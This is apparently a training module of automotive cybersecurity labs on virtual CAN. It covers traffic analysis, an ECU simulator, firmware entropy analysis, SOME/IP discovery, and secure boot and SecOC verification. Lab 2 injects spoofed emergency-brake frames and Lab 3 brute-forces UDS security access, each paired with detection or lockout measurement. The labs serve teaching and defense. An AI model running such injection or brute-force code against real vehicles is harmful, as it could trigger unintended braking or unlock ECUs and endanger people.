# Module 16 — Hands-On Labs

> Level: Practical | Est. study time: 16 hours (all labs)

---

## Prerequisites

```
HARDWARE:
  □ PCAN-USB or PEAK PCAN adapter (or vcan for virtual)
  □ OBD-II cable (for real vehicle testing — optional)
  □ Raspberry Pi 4 (optional, for Gateway IDS lab)
  □ FTDI USB-UART adapter (optional, for serial console labs)

SOFTWARE:
  □ Ubuntu 20.04+ or macOS with Homebrew
  □ Python 3.9+
  □ python-can, cantools, udsoncan, scapy, cryptography packages
  □ can-utils (Linux: sudo apt install can-utils)
  □ Wireshark with automotive plugins
  □ Ghidra 10.x (from NSA GitHub releases)
  □ SavvyCAN (Qt-based CAN analyzer GUI)

VIRTUAL SETUP:
  # Create virtual CAN interfaces (no hardware needed!)
  sudo modprobe vcan
  sudo ip link add dev vcan0 type vcan
  sudo ip link set up vcan0
  sudo ip link add dev vcan1 type vcan
  sudo ip link set up vcan1
```

---

## Lab 1 — CAN Traffic Capture and Analysis

```bash
# ── OBJECTIVES ──────────────────────────────────────────────
# 1. Capture CAN frames using SocketCAN
# 2. Decode signals using a DBC file
# 3. Identify message patterns and cycle times

# STEP 1: Start virtual CAN and simulate traffic
sudo ip link add dev vcan0 type vcan && sudo ip link set up vcan0

# Generate test traffic in background
cangen vcan0 -g 10 -I 29A -L 8 -D RANDOM -n 1000 &

# STEP 2: Capture traffic
candump vcan0 -l  # Logs to candump-TIMESTAMP.log

# STEP 3: Analyze with cantools
```

```python
"""Lab 1 Analysis Script"""
import cantools
import can
import time

# Load DBC (use sample DBC or vehicle-specific one)
db = cantools.database.load_file("sample_vehicle.dbc")

with can.interface.Bus("vcan0", bustype="socketcan") as bus:
    start = time.time()
    msg_counts = {}
    
    while time.time() - start < 10:  # Capture 10 seconds
        msg = bus.recv(timeout=0.1)
        if msg:
            msg_counts[msg.arbitration_id] = msg_counts.get(msg.arbitration_id, 0) + 1
            
            # Try to decode with DBC
            try:
                decoded = db.decode_message(msg.arbitration_id, msg.data)
                print(f"0x{msg.arbitration_id:03X}: {decoded}")
            except KeyError:
                print(f"0x{msg.arbitration_id:03X}: UNKNOWN - {msg.data.hex()}")

# Print cycle time analysis
print("\n=== Message Frequency Analysis ===")
for msg_id, count in sorted(msg_counts.items()):
    cycle_ms = 10000 / count  # 10 seconds / count = cycle in ms
    print(f"0x{msg_id:03X}: {count} msgs, ~{cycle_ms:.0f}ms cycle")
```

```
EXPECTED OUTPUT:
  0x100: VehicleSpeed:  45.5 km/h, WheelSpeed_FL: 45.5, ...
  0x244: AEB_BrakeReq: 0, AEB_Status: STANDBY
  ...
  === Message Frequency Analysis ===
  0x100: 100 msgs, ~100ms cycle
  0x244: 50 msgs,  ~200ms cycle

LEARNING: Different messages have different cycle times. 
  Unusual cycle times → replay attack or injection indicator.
```

---

## Lab 2 — CAN Injection Attack

```python
"""
Lab 2: Inject a CAN message to simulate AEB activation
EDUCATIONAL PURPOSE ONLY — DO NOT USE ON REAL VEHICLES
"""
import can
import time

def inject_aeb_brake(channel: str = "vcan0"):
    """Inject fake AEB command message"""
    with can.interface.Bus(channel, bustype="socketcan") as bus:
        print("[LAB 2] Injecting AEB brake command...")
        
        # Simulate: 10 injected frames with AEB_BrakeReq = 1
        for i in range(10):
            # AEB message format (hypothetical):
            # Byte 0-1: AEB_BrakeReq (bit 0)
            # Byte 2:   Deceleration target (0-100%)
            # Byte 3:   Counter (0-15, cycling)
            data = bytearray(8)
            data[0] = 0x01      # AEB_BrakeReq = 1 (braking commanded)
            data[2] = 0x50      # 80% deceleration
            data[3] = i & 0x0F  # Counter
            
            msg = can.Message(
                arbitration_id=0x244,
                data=bytes(data),
                is_extended_id=False
            )
            bus.send(msg)
            print(f"  Injected frame {i+1}/10: {data.hex()}")
            time.sleep(0.01)
        
        print("[LAB 2] Injection complete")
        print("[DEFENSE] This attack would be blocked by SecOC:")
        print("  - No valid MAC → receiver ignores message")
        print("  - No valid counter → replay attack detected")

# Run defender (show IDS detection in parallel)
def run_ids_monitor(channel: str = "vcan0"):
    """Simplified IDS: detect unexpected AEB frames"""
    known_cycle_ms = 200  # Expected AEB message every 200ms
    last_time = {}
    
    with can.interface.Bus(channel, bustype="socketcan") as bus:
        while True:
            msg = bus.recv(timeout=0.5)
            if msg and msg.arbitration_id == 0x244:
                now = time.time()
                if msg.arbitration_id in last_time:
                    gap_ms = (now - last_time[msg.arbitration_id]) * 1000
                    if gap_ms < known_cycle_ms * 0.5:  # Too fast (injection)
                        print(f"[IDS ALERT] AEB message flood! Gap: {gap_ms:.1f}ms")
                last_time[msg.arbitration_id] = now
```

---

## Lab 3 — UDS Security Access Brute Force

```python
"""
Lab 3: UDS Security Access brute force tester
Tests: How many attempts before lockout? How long is the lockout?
Run against a simulated ECU (see Lab 4 for ECU simulator)
"""
import udsoncan
from udsoncan.connections import PythonIsoTpConnection
import isotp
import can
import time

class UDSSecurityTester:
    def __init__(self, channel="vcan0", tx_addr=0x7E0, rx_addr=0x7E8):
        # Set up ISO-TP connection
        stack = isotp.CanStack(
            bus=can.interface.Bus(channel, bustype="socketcan"),
            address=isotp.Address(isotp.AddressingMode.Normal_11bits,
                                  txid=tx_addr, rxid=rx_addr)
        )
        self.conn = PythonIsoTpConnection(stack)
    
    def test_lockout_policy(self):
        """Test how many wrong keys before lockout"""
        with udsoncan.Client(self.conn) as client:
            # Enter extended diagnostic session
            client.change_session(
                udsoncan.services.DiagnosticSessionControl.Session.extendedDiagnosticSession
            )
            
            attempt = 0
            locked = False
            
            while not locked and attempt < 20:
                attempt += 1
                try:
                    # Request seed
                    result = client.request_seed(0x01)
                    seed = int.from_bytes(result.service_data.security_seed, 'big')
                    print(f"Attempt {attempt}: Seed = 0x{seed:08X}")
                    
                    # Send WRONG key (deliberately incorrect)
                    wrong_key = (seed ^ 0xFFFFFFFF).to_bytes(4, 'big')
                    client.send_key(0x02, wrong_key)
                    print(f"  → Key accepted (UNEXPECTED — security issue!)")
                    
                except udsoncan.exceptions.NegativeResponseException as e:
                    nrc = e.response.code
                    print(f"  → NRC 0x{nrc:02X}: ", end="")
                    
                    if nrc == 0x35:  # invalidKey
                        print("Invalid key — expected")
                    elif nrc == 0x36:  # exceededNumberOfAttempts
                        print(f"LOCKOUT after {attempt} attempts!")
                        locked = True
                    elif nrc == 0x37:  # requiredTimeDelayNotExpired
                        print("Time delay active — measuring lockout duration")
                        self._measure_lockout_duration(client)
                        break
                    else:
                        print(f"Other NRC")
            
            print(f"\n=== Results ===")
            print(f"Lockout triggered after: {attempt} wrong attempts")
    
    def _measure_lockout_duration(self, client):
        """Measure how long lockout lasts"""
        start = time.time()
        while True:
            time.sleep(1)
            try:
                client.request_seed(0x01)
                duration = time.time() - start
                print(f"Lockout duration: {duration:.1f} seconds")
                return
            except udsoncan.exceptions.NegativeResponseException:
                elapsed = time.time() - start
                print(f"  Still locked... ({elapsed:.0f}s elapsed)")
```

---

## Lab 4 — ECU Simulator (Target for UDS Tests)

```python
"""
Lab 4: Simple ECU Simulator for testing
Simulates a basic ECU with:
- UDS Security Access (level 0x01/0x02)
- RDBI for VIN, software version
- Lockout after 3 wrong attempts
"""
import can
import isotp
import threading
import time
import os

class SimpleECUSimulator:
    def __init__(self, channel="vcan0", ecu_addr=0x7E8, tester_addr=0x7E0):
        self.bus = can.interface.Bus(channel, bustype="socketcan")
        self.stack = isotp.CanStack(
            bus=self.bus,
            address=isotp.Address(isotp.AddressingMode.Normal_11bits,
                                  txid=ecu_addr, rxid=tester_addr)
        )
        
        # Security state
        self.session = 0x01      # Default session
        self.auth_level = 0      # Not authenticated
        self.seed = 0
        self.wrong_attempts = 0
        self.lockout_until = 0
        
        # ECU data
        self.vin = b"1HGBH41JXMN109186"
        self.sw_version = b"SW_V2.3.1_RELEASE"
    
    def compute_expected_key(self, seed: int) -> int:
        """Security access key algorithm (simple for lab)"""
        return (seed ^ 0xCAFEBABE) & 0xFFFFFFFF
    
    def handle_uds_request(self, data: bytes) -> bytes:
        service_id = data[0]
        
        if service_id == 0x10:  # Diagnostic Session Control
            session_type = data[1]
            self.session = session_type
            return bytes([0x50, session_type])  # Positive response
        
        elif service_id == 0x22:  # Read Data By Identifier
            did = (data[1] << 8) | data[2]
            if did == 0xF190:  # VIN
                return bytes([0x62, 0xF1, 0x90]) + self.vin
            elif did == 0xF189:  # SW version
                return bytes([0x62, 0xF1, 0x89]) + self.sw_version
            else:
                return bytes([0x7F, 0x22, 0x31])  # NRC: requestOutOfRange
        
        elif service_id == 0x27:  # Security Access
            sub_func = data[1]
            
            if sub_func == 0x01:  # Request seed
                # Check lockout
                if time.time() < self.lockout_until:
                    return bytes([0x7F, 0x27, 0x37])  # requiredTimeDelayNotExpired
                
                self.seed = int.from_bytes(os.urandom(4), 'big')
                seed_bytes = self.seed.to_bytes(4, 'big')
                return bytes([0x67, 0x01]) + seed_bytes
            
            elif sub_func == 0x02:  # Send key
                received_key = int.from_bytes(data[2:6], 'big')
                expected_key = self.compute_expected_key(self.seed)
                
                if received_key == expected_key:
                    self.auth_level = 1
                    self.wrong_attempts = 0
                    return bytes([0x67, 0x02])  # Success
                else:
                    self.wrong_attempts += 1
                    if self.wrong_attempts >= 3:
                        self.lockout_until = time.time() + 10.0  # 10s lockout
                        return bytes([0x7F, 0x27, 0x36])  # exceededNumberOfAttempts
                    return bytes([0x7F, 0x27, 0x35])  # invalidKey
        
        return bytes([0x7F, service_id, 0x11])  # serviceNotSupported
    
    def run(self):
        """Main loop — receive and respond to UDS requests"""
        print("[ECU SIM] Starting... (vcan0, addr 0x7E8)")
        while True:
            self.stack.process()
            if self.stack.available():
                data = self.stack.recv()
                if data:
                    response = self.handle_uds_request(bytes(data))
                    self.stack.send(response)
            time.sleep(0.001)

# Run: python3 -c "from lab4 import SimpleECUSimulator; SimpleECUSimulator().run()"
```

---

## Lab 5 — Firmware Entropy Analysis

```python
"""
Lab 5: Analyze firmware binary for encrypted/compressed regions
Using entropy analysis (high entropy = encrypted or compressed)
"""
import math
import struct
from pathlib import Path
import matplotlib.pyplot as plt

def calculate_entropy(data: bytes, block_size: int = 256) -> list:
    """Calculate Shannon entropy in sliding blocks"""
    entropies = []
    for i in range(0, len(data) - block_size, block_size):
        block = data[i:i + block_size]
        entropy = 0.0
        freq = {}
        for byte in block:
            freq[byte] = freq.get(byte, 0) + 1
        for count in freq.values():
            p = count / block_size
            if p > 0:
                entropy -= p * math.log2(p)
        entropies.append(entropy)
    return entropies

def analyze_firmware(firmware_path: str):
    data = Path(firmware_path).read_bytes()
    entropies = calculate_entropy(data)
    
    print(f"Firmware: {firmware_path}")
    print(f"Size: {len(data):,} bytes")
    print(f"Overall entropy: {sum(entropies)/len(entropies):.2f} bits/byte")
    print()
    
    # Identify regions
    for i, e in enumerate(entropies):
        offset = i * 256
        if e > 7.5:
            print(f"ENCRYPTED/COMPRESSED region at 0x{offset:08X}: entropy={e:.2f}")
        elif e < 1.0:
            print(f"EMPTY/ZERO region at 0x{offset:08X}: entropy={e:.2f}")
    
    # Find interesting strings in low-entropy (plaintext) regions
    strings_found = []
    current_str = []
    for i, byte in enumerate(data):
        if 0x20 <= byte <= 0x7E:
            current_str.append(chr(byte))
        else:
            if len(current_str) >= 6:
                strings_found.append((i - len(current_str), "".join(current_str)))
            current_str = []
    
    # Filter for security-relevant strings
    security_patterns = ["key", "pass", "secret", "debug", "admin", "auth", 
                          "seed", "cert", "token", "hmac", "aes", "rsa"]
    print("\n=== Security-relevant strings ===")
    for offset, s in strings_found:
        if any(p.lower() in s.lower() for p in security_patterns):
            print(f"0x{offset:08X}: {s}")

# Usage: analyze_firmware("ecu_firmware.bin")
# Create test file: python3 -c "import os; open('test.bin','wb').write(os.urandom(4096))"
```

---

## Lab 6 — SOME/IP Service Discovery

```python
"""
Lab 6: Discover SOME/IP services on automotive Ethernet
"""
import socket
import struct
import ipaddress

SOMEIP_SD_PORT = 30490
SOMEIP_MULTICAST_GROUP = "239.192.255.255"

def send_someip_sd_find(interface_ip: str):
    """Send SOME/IP Service Discovery Find message to discover services"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    sock.bind(("", 0))
    
    # SOME/IP SD FindService entry
    entry = struct.pack(">BBBBHHHBBBB",
        0x00,    # Type: FindService
        0x00,    # Index1
        0x00,    # Index2
        0x01,    # Count
        0xFFFF,  # ServiceID: wildcard (find ALL services)
        0x0000,  # InstanceID: wildcard
        0x01,    # MajorVersion
        0x00, 0xFF, 0xFF, 0xFF  # MinorVersion: wildcard
    )
    
    # SOME/IP SD header (16 bytes) + entries array header (4 bytes) + entry (16 bytes)
    sd_payload = (
        struct.pack(">I", 0xC0000000) +  # Flags: reboot + unicast
        b"\x00\x00\x00" +               # Reserved
        struct.pack(">I", len(entry)) +  # Entries length
        entry +
        struct.pack(">I", 0)             # Options length (none)
    )
    
    # SOME/IP header: Message ID, Length, RequestID, Protocol, Interface, Message Type, Return Code
    header = struct.pack(">HHIHHBBBB",
        0xFFFF,  # ServiceID (SD uses 0xFFFF)
        0x8100,  # MethodID (SD uses 0x8100)
        8 + len(sd_payload),  # Length
        0x0000,  # ClientID
        0x0001,  # SessionID
        0x01,    # Protocol version
        0x01,    # Interface version
        0x02,    # MessageType: Notification
        0x00     # ReturnCode: E_OK
    )
    
    message = header + sd_payload
    sock.sendto(message, (SOMEIP_MULTICAST_GROUP, SOMEIP_SD_PORT))
    print(f"[LAB 6] Sent SOME/IP SD FindService (wildcard) to {SOMEIP_MULTICAST_GROUP}")
    
    # Listen for offers
    sock.settimeout(3.0)
    discovered = []
    try:
        while True:
            data, addr = sock.recvfrom(4096)
            if len(data) >= 16:
                service_id = struct.unpack(">H", data[0:2])[0]
                if service_id == 0xFFFF and len(data) > 28:
                    # Parse service offers from response
                    print(f"[DISCOVERED] Service offer from {addr[0]}: raw_data={data[16:32].hex()}")
    except socket.timeout:
        pass
    
    sock.close()
    return discovered
```

---

## Lab 7 — Secure Boot Verification Lab

```python
"""
Lab 7: Verify firmware signature using public key cryptography
Simulates Secure Boot signature verification
"""
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, padding
from cryptography.hazmat.backends import default_backend
import hashlib
import struct
import os

def generate_oem_keypair():
    """Simulate OEM root key generation (done once, stored in HSM)"""
    private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    public_key = private_key.public_key()
    
    # In reality: private key in HSM, public key burned to OTP
    pub_bytes = public_key.public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    print(f"[LAB 7] OEM key pair generated (ECDSA P-256)")
    print(f"  Public key length: {len(pub_bytes)} bytes")
    return private_key, public_key

def sign_firmware(firmware: bytes, private_key) -> bytes:
    """Sign firmware during build process"""
    signature = private_key.sign(firmware, ec.ECDSA(hashes.SHA256()))
    print(f"[LAB 7] Firmware signed: {len(signature)} byte signature")
    return signature

def verify_firmware_signature(firmware: bytes, signature: bytes, public_key) -> bool:
    """Verify firmware signature (runs in bootloader)"""
    try:
        public_key.verify(signature, firmware, ec.ECDSA(hashes.SHA256()))
        print("[LAB 7] Signature VALID — firmware is authentic")
        return True
    except Exception:
        print("[LAB 7] Signature INVALID — firmware rejected!")
        return False

def lab_run():
    # Simulate firmware binary
    firmware = os.urandom(64 * 1024)  # 64KB fake firmware
    
    # Step 1: Key generation (OEM side)
    private_key, public_key = generate_oem_keypair()
    
    # Step 2: Sign firmware (build pipeline)
    signature = sign_firmware(firmware, private_key)
    
    # Step 3: Verify (bootloader on ECU)
    print("\n--- Test 1: Valid firmware ---")
    verify_firmware_signature(firmware, signature, public_key)
    
    # Step 4: Tampered firmware (attacker modified one byte)
    print("\n--- Test 2: Tampered firmware ---")
    tampered = bytearray(firmware)
    tampered[1000] ^= 0xFF  # Flip bits at offset 1000
    verify_firmware_signature(bytes(tampered), signature, public_key)
    
    # Step 5: Wrong key (counterfeit signature)
    print("\n--- Test 3: Wrong signing key ---")
    attacker_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    attacker_sig = sign_firmware(firmware, attacker_key)
    verify_firmware_signature(firmware, attacker_sig, public_key)

if __name__ == "__main__":
    lab_run()
```

---

## Lab 8 — SecOC MAC Verification Lab

```python
"""
Lab 8: Implement and test SecOC-style MAC verification
"""
from cryptography.hazmat.primitives.cmac import CMAC
from cryptography.hazmat.primitives.ciphers import algorithms
from cryptography.hazmat.backends import default_backend
import struct
import os

class SecOCSimulator:
    def __init__(self):
        # Shared symmetric key (stored in HSM in real ECU)
        self.key = os.urandom(16)  # 128-bit AES key
        self.tx_counter = 0
        self.rx_counter = 0
    
    def compute_mac(self, data_id: int, payload: bytes, counter: int) -> bytes:
        """Compute 4-byte CMAC for a CAN message"""
        # Concatenate: DataID (2 bytes) | Counter (3 bytes) | Payload
        msg = struct.pack(">H", data_id) + counter.to_bytes(3, 'big') + payload
        
        c = CMAC(algorithms.AES(self.key), backend=default_backend())
        c.update(msg)
        full_mac = c.finalize()
        return full_mac[:4]  # Truncate to 32 bits for CAN frame
    
    def send_message(self, data_id: int, payload: bytes) -> bytes:
        """Transmit side: add SecOC protection"""
        self.tx_counter += 1
        mac = self.compute_mac(data_id, payload, self.tx_counter)
        
        # SecOC PDU = payload + truncated counter (3 bytes) + MAC (4 bytes)
        counter_trunc = self.tx_counter.to_bytes(3, 'big')
        secured_pdu = payload + counter_trunc + mac
        
        print(f"[TX] Counter={self.tx_counter}, MAC={mac.hex()}, PDU={secured_pdu.hex()}")
        return secured_pdu
    
    def receive_message(self, data_id: int, secured_pdu: bytes) -> tuple:
        """Receive side: verify SecOC protection"""
        payload_len = len(secured_pdu) - 7  # payload + 3 (counter) + 4 (mac)
        
        payload = secured_pdu[:payload_len]
        rx_counter = int.from_bytes(secured_pdu[payload_len:payload_len+3], 'big')
        rx_mac = secured_pdu[payload_len+3:]
        
        # Anti-replay: counter must increase
        if rx_counter <= self.rx_counter:
            print(f"[RX] REPLAY ATTACK! Counter {rx_counter} <= last {self.rx_counter}")
            return None, False
        
        # Verify MAC
        expected_mac = self.compute_mac(data_id, payload, rx_counter)
        if rx_mac != expected_mac:
            print(f"[RX] MAC INVALID! Expected {expected_mac.hex()}, got {rx_mac.hex()}")
            return None, False
        
        self.rx_counter = rx_counter
        print(f"[RX] Valid! Counter={rx_counter}, Payload={payload.hex()}")
        return payload, True

def lab_run():
    secoc = SecOCSimulator()
    
    print("=== Test 1: Normal transmission ===")
    pdu = secoc.send_message(0x0244, bytes([0x01, 0x50, 0x00, 0x00]))
    secoc.receive_message(0x0244, pdu)
    
    print("\n=== Test 2: Replay attack ===")
    secoc.receive_message(0x0244, pdu)  # Same PDU again → replay
    
    print("\n=== Test 3: Tampered payload ===")
    pdu2 = secoc.send_message(0x0244, bytes([0x00, 0x00, 0x00, 0x00]))
    tampered = bytearray(pdu2)
    tampered[0] = 0xFF  # Modify payload byte
    secoc.receive_message(0x0244, bytes(tampered))

if __name__ == "__main__":
    lab_run()
```

---

## Lab Summary

```
LAB     │ TOPIC                      │ SKILL DEMONSTRATED
────────┼────────────────────────────┼────────────────────────────────────
Lab 1   │ CAN Traffic Analysis       │ SocketCAN, cantools DBC decoding
Lab 2   │ CAN Injection              │ python-can, attack + IDS detection
Lab 3   │ UDS Security Access Test   │ udsoncan, brute force + lockout test
Lab 4   │ ECU Simulator              │ ISO-TP, UDS server implementation
Lab 5   │ Firmware Entropy Analysis  │ Binary analysis, string extraction
Lab 6   │ SOME/IP Service Discovery  │ SOME/IP-SD, automotive Ethernet
Lab 7   │ Secure Boot Verification   │ ECDSA, firmware signing/verification
Lab 8   │ SecOC MAC Verification     │ CMAC-AES-128, replay attack detection
```

**Next Module**: [17 — Edge Cases & Failure Modes](17_edge_cases.md)
